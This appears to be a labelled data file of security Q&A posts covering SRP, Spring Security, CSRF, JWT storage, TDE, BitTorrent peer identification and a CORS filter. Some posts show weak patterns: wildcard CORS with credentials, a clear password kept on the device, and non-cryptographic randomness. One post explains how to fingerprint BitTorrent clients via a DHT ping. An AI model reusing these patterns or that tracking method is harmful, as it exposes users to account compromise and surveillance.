<p>When the SRP author states that the server may choose the prime <em>n</em> and send it to the client, he does not mean that the server may choose a new prime <em>n</em> for every session; the same <em>n</em> must be used when the user password is first chosen (and <em>v</em> stored by the server) and when a key is exchanged. What the SRP author means is that an authentication session can begin by the server sending a <em>n</em>-value to the client and telling it ""we shall use this <em>n</em>, which is the <em>n</em> which we used when the password was chosen"". The client needs not be sure, security-wise, that this is indeed the same <em>n</em>, and not another <em>n</em> crafted by a fake server. In that sense, the value of <em>n</em> needs not be hardcoded in the client.</p>

<p><strong>However</strong>, if the client needs not check that the value of <em>n</em> is the same than used beforehand (it will have to be the same for the protocol to succeed, but a distinct <em>n</em> sent by a fake server will not endanger the password confidentiality), the client must still make sure that <em>n</em> is proper, which implies, <em>at least</em>, to check that <em>n</em> and <em>(n-1)/2</em> are prime. See for instance section 3.2 of RFC 5054. The bottom-line is that, for an efficient use of SRP, you really want to use a few hardcoded <em>n</em> values, which both client and server know.</p>

<p>Possibly, you could precompute 3 or 4 sets of parameters (values of <em>n</em> of distinct sizes, for paranoia/efficiency trade-offs), that the server stores, and in the client you store only the hashes of those values; when a password needs to be exchanged, the server sends <em>n</em> and the client verifies that its hash matches one of its hardcoded hash values. Alternatively, have both client and server store the values of <em>n</em>, and simply use short identifiers so that both client and server use the same value. Note that if the value of <em>n</em> depends on the user (a given server using several values of <em>n</em> concurrently, and must send the ""right one"" for a given user), then the protocol must arrange for the user to first state his name; this is the point of the ""<code>srp</code>"" TLS extension (section 2.8.1 of RFC 5054).</p>

<p>You cannot have the server change <em>n</em> for a given user after password choice, unless the server stores the password-equivalent value <em>x = H(s, P)</em>, and SRP was designed precisely to avoid such storage.</p>

<p>Note that there is no security issue whatsoever of having several distinct users on a given server or distinct servers use the same <em>n</em>. A single <em>n</em> can be fit for the whole world. RFC 5054 (appendix A) lists a few <em>n</em> of sizes 1024 to 8192 bits.</p>
",1
"<p>What do I need in order to unit test the hasRole part of a PreAuthorize annotation on a controller method? </p>

<p>My test should succeed because the logged in user only has one of the two roles, but instead it fails with the following assertion error:</p>

<blockquote>
  <p>java.lang.AssertionError: Status</p>
  
  <p>Expected :401</p>
  
  <p>Actual   :200</p>
</blockquote>

<p>I have the following method in MyController:</p>

<pre><code>@PreAuthorize(value = ""hasRole('MY_ROLE') and hasRole('MY_SECOND_ROLE')"")
@RequestMapping(value = ""/myurl"", method = RequestMethod.GET)
public String loadPage(Model model, Authentication authentication, HttpSession session) {
    ...stuff to do...
}
</code></pre>

<p>I created the following abstract-security-test.xml:</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;beans xmlns=""http://www.springframework.org/schema/beans""
       xmlns:security=""http://www.springframework.org/schema/security""
       xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
       xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.2.xsd
                        http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-3.2.xsd""&gt;

    &lt;security:global-method-security secured-annotations=""enabled"" /&gt;

    &lt;security:authentication-manager alias=""authManager""&gt;
        &lt;security:authentication-provider&gt;
            &lt;security:user-service&gt;
                &lt;security:user name=""missingsecondrole"" password=""user"" authorities=""MY_ROLE"" /&gt;
            &lt;/security:user-service&gt;
        &lt;/security:authentication-provider&gt;
    &lt;/security:authentication-manager&gt;

&lt;/beans&gt;
</code></pre>

<p>And in my unit test I have this:</p>

<pre><code>@ContextConfiguration(""classpath:/spring/abstract-security-test.xml"")
public class MyTest {
    private final MyController myController = new MyController();
    @Autowired
    private AuthenticationManager manager;

    @Test
    public void testValidUserWithInvalidRoleFails() throws Exception {
        MockMvc mockMvc = standaloneSetup(myController).setViewResolvers(viewResolver()).build();

        Authentication auth = login(""missingsecondrole"", ""user"");

        mockMvc.perform(get(""/myurl"")
            .session(session)
            .flashAttr(MODEL_ATTRIBUTE_NAME, new ModelMap())
            .principal(auth)).andExpect(status().isUnauthorized());
    }

    protected Authentication login(String name, String password) {
        Authentication auth = new UsernamePasswordAuthenticationToken(name, password);
        SecurityContextHolder.getContext().setAuthentication(manager.authenticate(auth));
        return auth;
    }

    private ViewResolver viewResolver() {
        InternalResourceViewResolver viewResolver = new InternalResourceViewResolver();
        viewResolver.setPrefix(""WEB-INF/views"");
        viewResolver.setSuffix("".jsp"");
        return viewResolver;
    }
}
</code></pre>
",1
"<p>I want to ensure my WearableListenerService running on my handheld is only accessible by my companion app. I would think that creating a custom permission would be the route to take however I faced issues with this approach and could not get the wearable to successfully bind to the handheld, I would get the following exception on my handheld;</p>

<pre><code>Permission Denial: Accessing service ComponentInfo{com.mypackage.android/com.mypackage.android.androidwear.service.WearListenerService} from pid=4868, uid=10014 requires com.mypackage.android.WATCHAPP
WearableService: bind: Permission denied connecting to ServiceRecord[com.mypackage.android.androidwear.service.WearListenerService, events=1, bound=false, [Event[79380002: onMessageReceived, event=requestId=16741, action=/start-activity, dataSize=26, source=31c5457d]]]
                                              java.lang.SecurityException: Not allowed to bind to service Intent { act=com.google.android.gms.wearable.BIND_LISTENER cmp=com.mypackage.android/.androidwear.service.WearListenerService }
                                                  at android.app.ContextImpl.bindServiceCommon(ContextImpl.java:1437)
                                                  at android.app.ContextImpl.bindService(ContextImpl.java:1395)
                                                  at android.content.ContextWrapper.bindService(ContextWrapper.java:632)
                                                  at android.content.ContextWrapper.bindService(ContextWrapper.java:632)
                                                  at android.content.ContextWrapper.bindService(ContextWrapper.java:632)
                                                  at aeim.a(:com.google.android.gms:6693)
                                                  at aeim.a(:com.google.android.gms:1378)
                                                  at aeim.handleMessage(:com.google.android.gms:1295)
                                                  at android.os.Handler.dispatchMessage(Handler.java:102)
                                                  at android.os.Looper.loop(Looper.java:158)
                                                  at android.os.HandlerThread.run(HandlerThread.java:61)
</code></pre>

<p>I have tried defining a custom permission in a number of ways, initially in only the handheld manifest and then in both manifests, as well as trying different protection levels, normal, signature, signatureOrSystem.  I even verified that the permission was successfully granted to my wearable by running the dumpsys command;</p>

<pre><code>declared permissions:
  com.mypackage.android.WATCHAPP: prot=normal, INSTALLED
requested permissions:
  android.permission.WAKE_LOCK
  com.mypackage.android.WATCHAPP
install permissions:
  com.mypackage.android.WATCHAPP: granted=true
  android.permission.WAKE_LOCK: granted=true
</code></pre>

<p>I have applied a data filter to my service however I would like to enforce that only MY app can launch my service and the filter approach doesn't seem sufficient.</p>
",1
"<blockquote>
  <p>How secure should it be</p>
</blockquote>

<p>Given customer input their personal data into the kiosk owned by your company, it is critical that the kiosk be hardened to be as secure as possible.</p>

<blockquote>
  <p>What steps can I take to make it more secure?</p>
</blockquote>

<ol>
<li><strong>Do not run the kiosk in Administrator mode unless such elevated privileges are critical to its functionality</strong></li>
</ol>

<p>The kiosk software currently runs in Administrator mode, which is ill-advised. Normally, systems should be run with the minimum set of privileges needed to perform its function, a concept known in IT security as <a href=""https://www.sans.org/reading-room/whitepapers/bestprac/implementing-privilege-enterprise-1188"" rel=""nofollow noreferrer"">Least Privilege</a>. In this way, if an attacker were to compromise the machine, it would mitigate somewhat what he / she can do.</p>

<ol start=""2"">
<li><strong>Implement a means to segregate the kiosk machine from your internal company network</strong></li>
</ol>

<p>You mention that the kiosk only needs Internet access. It is advised that you segregate this kiosk through a demilitarized zone (DMZ) and implement ACL rules through a firewall to prevent direct connections to your internal network. Any connections from the public facing Internet is <strong>by nature untrusted</strong></p>

<ol start=""3"">
<li><strong>Implement means to securely transmit customer data from when it is inputted into the kiosk to the destination where it will be processed.</strong></li>
</ol>

<p>Given the kiosk is Internet facing, if a secure method of data transmission is not used such as TLS 1.2+, sensitive customer information can be easily sniffed off the wire by attakers on the Internet. </p>

<ol start=""4"">
<li><strong>Implement means to authenticate the user who remote logins to the kiosk.</strong></li>
</ol>

<p>You mention that the kiosk software is owned by a third party. Without a reliable means of authentication, you cannot trust that the individual connecting to is who he / she says they are. There should be means such as RADIUS or TACACS+ that centrally authenticates remote users. Only when their identity has being verified by the system should they be granted access. </p>

<ol start=""5"">
<li><strong>Implement means to securely store customers information and mask information entered by the customer on screen.</strong></li>
</ol>

<p>Given customers enter their personal data into the kiosk, it is important that sensitive data such as SSN be masked when displayed on the screen. You did not describe the physical environment where the kiosk is located, but there could be a significant risk of leakage of customer data through  shoulder - surfing. You would also want to verify that sensitive data is securely stored by the kiosk, ideally in encrypted and or hashed format, depending on whether access to the input data is important. <strong>Use a strong encryption or hashing algorithm such as AES with a long key length to maximize protection.</strong></p>
",1
"<p>Is it safe to use the following stateless authorization mechanism between a client (iOS &amp; Android) and server?</p>

<p><strong>Sign up</strong></p>

<ol>
<li><p>The client provides an email and password and saves <strong>the clear password</strong> on the <code>Keychain</code> of iOS and using some <a href=""https://medium.com/@ericfu/securely-storing-secrets-in-an-android-application-501f030ae5a3"" rel=""nofollow noreferrer"">alternative</a> for Android.</p></li>
<li><p>The server checks the password strength if it's deemed strong enough the user is created on DB. </p></li>
<li><p>The server generates a <code>JWT token</code> and returns it to the client. The token has an expiration time of 15 minutes.</p></li>
<li><p>The client stores the token (maybe on the <code>Keychain</code> itself) and includes it for each following request on the <code>Authorization</code> header.</p></li>
<li><p>For each request, the server checks the token provided (checks the signature and the expiration time). If it's ok the request is processed, otherwise, an <code>HTTP 401</code> is returned.</p></li>
</ol>

<p><strong>Sign in</strong></p>

<ol>
<li><p>When the client receives an <code>HTTP 401</code> from the server it means a login is required. So the app accesses to the <code>Keychain</code> and gets the email &amp; password and sends it to the server (no user intervention needed).</p></li>
<li><p>The server validates the credentials provided and if they're valid it will repeat the <strong>Sign Up</strong> steps from 3 to 5.</p></li>
</ol>

<p>Thanks to expiration time on the token, if a token is compromised it will be valid during a short time period.</p>

<p>If a user is logged on multiple devices and she changes her password from one device, the other devices will keep logged only for a short time period, but the clear password stored on the <code>Keychain</code> will not be longer valid. So a new manual login will be required, which I think it's fine.</p>

<p><strong>Which drawbacks do you see?</strong> </p>

<p>I've been thinking on using <a href=""https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/"" rel=""nofollow noreferrer"">refresh token</a> procedure to avoid store the clear password but this adds complexity and other drawbacks (for example: how to guarantee the <code>refresh token</code> is only used once). And as far as I've seen, storing the clear password on the <code>KeyChain</code> is secure enough:</p>

<p><a href=""https://developer.apple.com/documentation/security/keychain_services"" rel=""nofollow noreferrer"">KeyChain Services Documentation</a></p>

<p><a href=""https://stackoverflow.com/questions/13466249/what-is-the-best-way-to-maintain-the-login-credentials-in-ios"">What is the best way to maintain the login credentials in iOS?</a></p>

<p>But I also have seen <a href=""https://stackoverflow.com/questions/1925486/android-storing-username-and-password"">other questions</a> that do not recommend storing passwords on the device.</p>

<p>So I would like to hear opinions from others on this.</p>
",1
"<p><strong>Disclaimer:</strong> My question is somewhat similar to <a href=""https://stackoverflow.com/questions/22524470/spring-security-3-2-csrf-disable-for-specfic-urls/29147610"">this question</a> and <a href=""https://stackoverflow.com/questions/26179940/spring-security-enable-disable-csrf-by-client-type-browser-non-browser/26239302?noredirect=1#comment49059085_26239302"">this question</a>, but I have tried all the answers suggested in those threads and already spent few days struggling with the problem.</p>

<p>I am introducing Spring Security 3.2.6 in my existing application (JSP, Servlet only) and I am using Java configuration. My application will be used both by browsers and non-browser clients. I want all the browser requests to URLs (i.e. <code>/webpages/webVersion/</code> and <code>/webpages/webVersion2/</code>) to be CSRF enabled and all the other requests to be CSRF disabled. Non-browser clients never access above two URLs, whereas the browser application may also access CSRF disabled URLs.</p>

<p>I have tried a variety of options:</p>

<ol>
<li><p>Enable Spring Security only on the aformentioned URLs:</p>

<pre><code>@Override
protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
        .antMatchers(""/"",""/resources/****"").permitAll()
        .antMatchers(""/webpages/webVersion/****"", ""/webpages/webVersion2/****"").authenticated()
        .antMatchers(""/webpages/****"").permitAll()
        .anyRequest().anonymous()
        .and()
        .formLogin().loginPage(""/webpages/webVersion/login/newLogin.jsp"").failureUrl(""/webpages/webVersion/login/newLogin.jsp?error=true"").loginProcessingUrl(""/j_spring_security_check"")
        .usernameParameter(""username"").passwordParameter(""password"").defaultSuccessUrl(""/webpages/webVersion/login/loginSuccess.jsp"", true).permitAll()
        .and()
        .logout().logoutUrl(""/webpages/webVersion/logout.jsp"").permitAll()
        .and().exceptionHandling().accessDeniedPage(""/webpages/webVersion/404-error-page.jsp"")
        .and()
        .csrf();
} 
</code></pre>

<p>This didn't work as I observe that CSRF is enabled for all of the URLs. </p></li>
<li><p>Tried using <code>CSRFProtectionMatcher</code>:</p>

<pre><code>.csrf().requireCsrfProtectionMatcher(csrfRequestMatcher); 
</code></pre>

<p>CSRF is enabled for intended URLs only, but even <code>/resources/**</code> and <code>/webpages/**</code> URLs need to be checked inside matches function.  Seems to be a bit much considering it will be for all requests.</p></li>
<li><p>Tried using another version of the <code>configure</code> method:</p>

<pre><code>@Override
public void configure(WebSecurity web) throws Exception {
    web.ignoring().regexMatchers("".*?/jsp/(?!webVersion|webVersion2).*?"");
}
</code></pre>

<p>I am not sure whether I did it correctly but this didn't produce the results I wanted.</p></li>
</ol>

<hr>

<p>Which of the above approach is the correct (Spring Security) way of doing what I want? How can I achieve the desired behavior from my Spring Security configuration?</p>
",1
"<p>I just installed Grails 3.0.8 , created an app, and installed the Spring-Security-core plugin whose version is 3.0.0.M1. And then, I followed the steps of <a href=""http://grails-plugins.github.io/grails-spring-security-core/guide/tutorials.html"" rel=""nofollow"">tutorials</a> of the plugin.</p>

<p>But, the authentication does not work well. It means that I cannot access top directory page, <a href=""http://localhost:8080"" rel=""nofollow"">http://localhost:8080</a>, always the error message is shown on page. The error message is ""Sorry, you're not authorized to view this page."".</p>

<p>How can I make the plugin works well?</p>

<p>Following steps are that I did.</p>

<ol>
<li><p>create-app using comand</p>

<pre><code>$ grails create-app testApp profile=web
$ cd testApp
</code></pre></li>
<li><p>""Install"" the plugin by adding it to build.gradle</p>

<pre><code>dependencies {
   …
   compile 'org.grails.plugins:spring-security-core:3.0.0.M1'
   …
}
</code></pre></li>
</ol>

<p>Run the compile command with interactive mode.</p>

<pre><code>    $ grails 
    grails&gt; compile
    grails&gt; exit
</code></pre>

<ol start=""3"">
<li><p>Create the User and Role domain classes with interactive mode.</p>

<pre><code>$ grails 
grails&gt; s2-quickstart common User Role
</code></pre></li>
<li><p>Edit grails-app/init/BootStrap.groovy to add a test user.</p>

<pre><code>import com.testapp.Role
import com.testapp.User
import com.testapp.UserRole
class BootStrap {

   def init = { servletContext -&gt;

      def adminRole = new Role('ROLE_ADMIN').save()
      def userRole = new Role('ROLE_USER').save()

      def testUser = new User('me', 'password').save()

      UserRole.create testUser, adminRole, true

   }
}
</code></pre></li>
<li><p>Start the server with interactive mode.</p>

<pre><code>grails&gt; run-app
</code></pre></li>
<li><p>navigate to <a href=""http://localhost:8080"" rel=""nofollow"">http://localhost:8080</a>.</p></li>
<li><p>input ""me"" on user field and ""password"" on password field, and click submit.</p>

<p>Then, the message is shown on the page</p>

<pre><code>Sorry, you're not authorized to view this page.
</code></pre></li>
</ol>

<p>Note:</p>

<p>the application.groovy is shown below, but I made no change.</p>

<pre><code>    // Added by the Spring Security Core plugin:
    grails.plugin.springsecurity.userLookup.userDomainClassName = 'common.User'
    grails.plugin.springsecurity.userLookup.authorityJoinClassName = 'common.UserRole'
    grails.plugin.springsecurity.authority.className = 'common.Role'
    grails.plugin.springsecurity.controllerAnnotations.staticRules = [
        '/':                ['permitAll'],
        '/error':           ['permitAll'],
        '/index':           ['permitAll'],
        '/index.gsp':       ['permitAll'],
        '/shutdown':        ['permitAll'],
        '/assets/**':       ['permitAll'],
        '/**/js/**':        ['permitAll'],
        '/**/css/**':       ['permitAll'],
        '/**/images/**':    ['permitAll'],
        '/**/favicon.ico':  ['permitAll']
    ]
</code></pre>
",1
"<p>No, I think your math is off.  I do not think this is actually a real vulnerability.   If your description of the format is accurate, and if the numbers generated via a truly random source -- then no, I don't think it is so easy to stumble across other people's pictures.</p>

<p>Let's work the math.  There are 33 random digits in the URL.  That means there are 10<sup>33</sup> possible URLs.  Suppose this web site has one billion users (10<sup>9</sup>), and each user posts 1000 pictures (10<sup>3</sup>).  (I'm being generous here.)  Then there would be 10<sup>12</sup> pictures posted in all.  This means that accessing a randomly chosen URL would have a 10<sup>12</sup>/10<sup>33</sup> = 1 in 10<sup>21</sup>.</p>

<p>In other words, you will have to try about one thousand billion billion (10<sup>21</sup>) times before stumbling on a single picture from someone else.  That would take approximately, oh, forever.</p>

<p>Oh, you want a more precise estimate?  OK, OK, here goes.  Suppose you can make 1000 requests per second (probably a generous estimate, but let's run with it).  Then it would take you 10<sup>18</sup> seconds before you stumble across the first picture, with just random guessing.  There are about pi times 10<sup>7</sup> seconds in a year, so it will take you about 3 * 10<sup>10</sup> years before your first success.  That's longer than the known lifetime of the universe.  (By the time you stumble across your first picture, everyone shown in the picture will have been long since dead, and they won't care any more.)</p>

<p>So, no, this attack is not a threat.  As long as the random numbers in the URL are <em>truly</em> random and unpredictable, this scheme is secure.</p>

<hr>

<p>The biggest risk comes if the numbers in the are not actually truly cryptographically random.  If the numbers are generated using a non-crypto-strength pseudorandom number generator, or via some other predictable sequence, then the scheme could be vulnerable.</p>

<p>Ironically, your example code would is a good example of how not to do it.  You used Python's built-in <code>random</code> generator.  That is not cryptographic-strength, and thus its output is likely to be predictable.  The security is at best as good as the amount of entropy in the seed to the pseudorandom generator.  Even worse, with many such pseudorandom number generators, if you observe a few outputs from the generator, you can predict all following outputs -- which would be deadly to the security of such an image-hosting scheme.</p>

<p>Is your website using a vulnerable pseudorandom number generator?  If they know what they are doing, I sure hope not.  However, you probably have no good way to know for sure from the outside.</p>

<p>To learn more about the subject, I'd like to refer you to two resources: first, <a href=""https://security.stackexchange.com/a/2211/971"">Make sure you seed random number generators with enough entropy</a>; and second, this Dilbert cartoon:</p>

<p><img src=""https://i.stack.imgur.com/NEUXW.gif"" alt=""Dilbert on randomness""></p>
",1
"<p>I'm working on a internal web application (only employees can log in) and need some help figuring out a good approach to handling an individual users permissions to the system. </p>

<p>The system itself is in C# / ASP.NET (4.0 / Webforms / Forms Authentication) / SQL Server 2008 and has several different areas which will have varying sets of permissions. You can think of it in a basic crud scenario (create, view, update, delete) though those would apply to different aspects of the system.</p>

<p>(I do want to mention this isn't a type of CMS system, so I can't pick an Open Source Project like DotNetNuke or anything. This is being developed from scratch. I can use open source libraries if they are available though.)</p>

<p>What would be a good approach to designing the User Permission system for a complex system with probably 5-6 different sections that have a good 10-15 different view/update/deletes contained in each section? </p>

<p>The goal here is to make it: </p>

<ol>
<li>Understandable for Users (Admins) to use / set up. </li>
<li>Easy to Maintain Code Wise.</li>
<li>Easy to adapt as new permissions are needed (different types or in different spots).</li>
</ol>

<p>There are two approaches that come to mind: </p>

<p>Approach 1: </p>

<blockquote>
  <p>Try to use the built in ASP.NET Roles system to define the different permissions and manage it from there. I could build custom pages to handle the different areas and assign permission sets to users. I believe that would also allow me to use the current session object by default to contain all of the permissions in the system for a user. (HttpContext.User.IsInRole() etc...).</p>
</blockquote>

<p>Now, while I think that method would work, I'm not sure it's going to be easy to maintain or adapt to future needs. It seems like it'd be the quicker way to get it up off the ground and working but not the best long term.</p>

<p>Approach 2: </p>

<blockquote>
  <p>Roll my own. In this scenerio, I'd set up database tables to store true/false style permissions for each section of the application. Then I'd retrieve that information and place it in the session and basically access it anytime I need to check if someone has permissions to do something. I'd then build the custom pages to manage the lists, etc..</p>
</blockquote>

<p>It seems this approach might be the more maintainable long term solution. It gives me more power in the set up and how it is handled. However, I'm basically still doing the work that the Roles system abstracts away for me in approach 1. I favor this over approach 1 still however.</p>

<hr>

<p>In the end, I'm not sure if either approach is the best way to handle this. Can anyone help explain to me why either of the above would be good / bad? Or even to suggest a different alternative as to the ""best"" way to handle it in general would actually be. This is my first major undertaking in this area, so I don't have a great deal of experience in trying to ""secure"" an application like this by permissions. Any and all help is appreciated!</p>
",1
"<p>Once it starts, a BitTorrent client generates a 20-byte identifier called <code>peer_id</code>, it consists of <code>ClientIdentifierClientVersion-RandomNumbers</code>. Granted, <code>ClientIdentifier</code> and <code>ClientVersion</code> don't provide any identification, but the <code>RandomNumbers</code> <em>could</em> be used to identify a client, and there are some things that needs to be understood:</p>

<ul>
<li><p>The <code>peer_id</code> could be anything the clients wants so send. The protocol doesn't define how it should be generated, nor it defines how it should be structured.</p></li>
<li><p>The client gives its <code>peer_id</code> to whomever asks for it (it's part of the handshake).</p></li>
<li><p>Setting the <code>no_peer_id</code> flag allows for the communication to happen without needing to disclose the <code>peer_id</code>.</p></li>
<li><p>The <code>peer_id</code> is generated every time the clients is restarted. uTorrent 3.3 even generate a new <code>peer_id</code> <em>while</em> it's running from time to time.</p></li>
</ul>

<p>However, <a href=""https://en.wikipedia.org/wiki/BitTorrent"" rel=""nofollow"">BitTorrent</a>'s uses a <a href=""https://en.wikipedia.org/wiki/Distributed_hash_table"" rel=""nofollow"">DHT</a> called <a href=""https://en.wikipedia.org/wiki/Kademlia"" rel=""nofollow"">Kademlia</a>, which is a great news for security researches (AKA stalkers). A while ago, I've analyzed uTorrent and Transmission, they both use encryption for DHT/PEX (if enabled and forced).</p>

<p>When a client enters the DHT ""network"" it bootstraps by connecting to some bootstrap server. This usually happens the first time you run a new client. But that's not the only thing that happens when bootstrapping Kademlia.</p>

<p>When a client joins the network, it is given a randomly generated identifier called <code>node ID</code>. This node ID is randomly chosen from the same 160-bit space as the BitTorrent 'info hashes'. At any time, you can clear your DHT information and rejoin the network, which would give you a new identifier. Since not many users do that, you can relatively count on it as an identifier.</p>

<p>To get a client's <code>node ID</code> it's enough to send them a DHT <code>ping</code> message, and it will respond with its ID</p>

<p><code>{""t"":""T_ID"", ""y"":""q"", ""q"":""ping"", ""a"":{""id"":""THE_SENDER_ID</code>""}}</p>

<ul>
<li><code>t</code> is transaction ID, it identifies the message and is sent back with the response</li>
<li><code>y</code> is the type of the message, and the value <code>""q""</code> means it's a query.</li>
<li><code>q</code> is the is the type of the query, and here it's a ping query.</li>
<li><code>a</code> represents the arguments of the query. Here it simply contains the sender's node ID.</li>
</ul>

<p>A client would respond</p>

<pre><code>Response = {""t"":""T_ID"", ""y"":""r"", ""r"": {""id"":""MY_ID""}}
</code></pre>

<p>the value <code>""r""</code> for <code>y</code> means that this is a response.</p>

<p>Those are mainly the two ways to identify a client provided by the protocol itself.</p>
",1
"<p>I am assuming that you are here talking about the ""TDE"" feature provided by Microsoft SQL Server.</p>

<hr />

<p><a href=""http://msdn.microsoft.com/en-us/library/bb934049.aspx"">TDE</a> means <em>Transparent Data Encryption</em>, emphasis on ""transparent"". This is an encryption layer applied on data as it is stored; every single byte that SQL Server manages is encrypted before being written on disk, and decrypted when read. Applications which use SQL Server need not be aware of that process; it is a matter which resides purely in the dialogue between SQL Server and its storage files. Hence the transparency. The nice side of it is that it is easy to apply, and performs very well (small to negligible CPU overhead, no extra I/O, no extra space...). The dark side is that SQL Server itself, not the application, is the gatekeeper: whoever is granted access by SQL Server will be able to see the clear data.</p>

<p>For PCI compliance, see <a href=""https://www.pcisecuritystandards.org/pdfs/pci_fs_data_storage.pdf"">this document</a> which includes this paragraph (at the end):</p>

<blockquote>
  <p>Some cryptography solutions encrypt specific fields of informatio
  n stored in a database; others
  encrypt a singular file or even the entire disk where data is stored. If full-disk encryption is used,
  logical access must be managed independently of native operating system access control
  mechanisms. Decryption keys must not be tied to user accounts. Encryption keys used for
  encryption of cardholder data must be protected against both disclosure and misuse. All key
  management processes and procedures for keys used for encryption of cardholder data must be
  fully documented and implemented. For more details, see PCI DSS Requirement 3.</p>
</blockquote>

<p>""Full-disk encryption"" is what applies to TDE (TDE is nominally applied on <em>files</em>, but all of them). In TDE, the actual encryption key is managed by SQL Server, who will grant or not-grant logical access to users based on... its configuration, which may or may not map on user accounts. So I would say that whether TDE grants PCI compliance depends on <em>how it is used</em>.</p>

<p>I am not entitled to give a definitive answer on how PCI compliance can be achieved with TDE, but I note that <a href=""http://en.wikipedia.org/wiki/Transparent_Data_Encryption"">the Wikipedia page</a> includes an encouraging excerpt: ""Enterprises typically employ TDE to solve compliance issues such as PCI DSS."" So it can be surmised that meeting PCI requirements with TDE is <em>possible</em>, or at least many people appear firmly convinced that it is possible, which is almost as good.</p>

<p>Microsoft has <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=6808"">documentation</a> on how SQL Server should be configured and used in a compliance context. They also have a <a href=""https://msevents.microsoft.com/CUI/EventDetail.aspx?culture=en-US&amp;EventId=1032404174&amp;CountryCode=US"">Webcast</a> which may include a lot of useful information (I have not viewed it).</p>
",1
"<p>Skeuomorphic design is tempting: To differentiate a product from its competitors; but at the cost of reinventing the (UI) wheel and creating absurd learning hurdles for users. No website should be so unique as to exceed a user's motivation to learn how to use it.</p>

<p>For security, there are few consequences of using skeuomorphic design (especially where skeuomorphism isn't the <em>de facto</em> UI element):</p>

<ul>
<li><strong>Loss of information:</strong> <em>The chrome of Skeuomorphic UI reduces or prohibits visibility of important security context information for the user.</em> For example, a web browser pretending to be a ""racing car windscreen"" or Tron-style virtual world hides the website address as ""too 2D/old skool"" and not ""skeuomorphic"".</li>
<li><strong>Drowns out high priority information</strong>: <em>The security information might be visible on the screen but camouflaged as an innocuous UI element.</em> For example, a remote gardening program displayed as a planet nursery could have connectivity errors and warnings displayed as a cutesy wilted pot-plant. The information was there but not especially modal or explicit.</li>
<li><strong>Culturally ambiguous</strong>: <em>Translating security and safety text between languages is <a href=""http://geekology.ucoz.com/load/signs/fail_signs/slip_carefully_epic_sign_failure/2-1-0-17"" rel=""nofollow"">hard enough</a>, skeuomorphic design assumes the underlying product ever existed in that culture.</em> For example, a red bulb on a skeuomorphic internet radio application might mean something <a href=""http://webdesign.about.com/od/color/a/bl_colorculture.htm"" rel=""nofollow"">quite different</a> in non-western cultures.</li>
<li><strong>Hard to navigate</strong>: <em>Most skeuomorphic applications are only visually skeuomorphic, with none of the ease and speed of use of the original 3D object; this can result in mistakes or delays that can have serious consequences in quick-reflex/high-security scenarios</em>. For example, checking the current fuel level of car shouldn't involve dragging a visual dipstick in and out of a tank on a touchscreen.</li>
<li><strong>Can not use pre-tested third party libraries</strong>: <em>Each skeuomorphic application has custom UI otherwise why bother? Hence the security of the interface layer does not benefit from the ""<a href=""http://en.wikipedia.org/wiki/Linus%27s_Law"" rel=""nofollow"">many eyes - shallow bugs</a>"" effect of common third party resources.</em> For example, your checkbook application looking like a physical checkbook instead using international standards for checking information.</li>
<li><strong>Difficult to audit if business logic in UI</strong>: <em>No idea if the application is leaking information it shouldn't. Security auditors have to learn each application's custom UI to review it.</em> For example, when website UI conventions did not exist, the <em>pi symbol</em> in that <a href=""http://www.youtube.com/watch?v=pXPXMxsXT28"" rel=""nofollow"">The Net movie</a> was plausible on website front page.</li>
</ul>
",1
"<p>I am trying to add OAuth 2.0 in spring mvc app. User should be authenticated in order to get a api call. I have set a headers in spring mvc controller as:</p>

<pre><code>@RequestMapping(value = ""/admin-api/get-all-order"", method = RequestMethod.GET)
    public ResponseEntity getAllOrders(@RequestHeader(""Authorization"") String bearerToken) {
        try {
            List&lt;OrderModel&gt; order = orderService.getAllOrders();
            return new ResponseEntity(order, HttpStatus.OK);
        } catch (HibernateException e) {
            return new ResponseEntity(e.getMessage(), HttpStatus.BAD_REQUEST);
        }
    }
</code></pre>

<p>For requesting api I have used angular 5. I make a api call in angular like:</p>

<pre><code>return this.http.get&lt;T&gt;(this.getAllOrderUrl, {
            headers: {
                ""Authorization"": ""bearer "" + JSON.parse(localStorage.getItem(""token""))[""value""],
                ""Content-type"": ""application/json""
            }
        }).catch(error =&gt; {
            return this.auth.handleError(error);
        })
</code></pre>

<p>But it gave me a strange error.
<a href=""https://i.stack.imgur.com/gFWEs.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/gFWEs.png"" alt=""enter image description here""></a></p>

<p>I have already enabled a CORS for 'localhost:4200'. CORS filtering works fine on other request.</p>

<pre><code>@Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) res;
        HttpServletRequest request = (HttpServletRequest) req;
        response.setHeader(""Access-Control-Allow-Origin"", ""*"");
        response.setHeader(""Access-Control-Allow-Credentials"", ""true"");
        response.setHeader(""Access-Control-Allow-Methods"",
                ""ACL, CANCELUPLOAD, CHECKIN, CHECKOUT, COPY, DELETE, GET, HEAD, LOCK, MKCALENDAR, MKCOL, MOVE, OPTIONS, POST, PROPFIND, PROPPATCH, PUT, REPORT, SEARCH, UNCHECKOUT, UNLOCK, UPDATE, VERSION-CONTROL"");
        response.setHeader(""Access-Control-Max-Age"", ""3600"");
        response.setHeader(""Access-Control-Allow-Headers"",
                ""X-PINGOTHER,Content-Type,X-Requested-With,Accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,Authorization,Key"");

        if (""OPTIONS"".equalsIgnoreCase(request.getMethod())) {
            response.setStatus(HttpServletResponse.SC_OK);
        } else {
            chain.doFilter(req, res);
        }
    }
</code></pre>

<p>If I tried in postman it give me a desired result.
<a href=""https://i.stack.imgur.com/1729D.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/1729D.png"" alt=""enter image description here""></a></p>

<p><strong>Response Header</strong>
<a href=""https://i.stack.imgur.com/iWZ4S.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/iWZ4S.png"" alt=""enter image description here""></a></p>

<p>What am I doing wrong? Please help me out. Hoping for positive response thanks!</p>
",1
"Young people were singled out as increasingly likely victims of internet-borne fraud, including because of their penchant for liberal sharing of personal information.

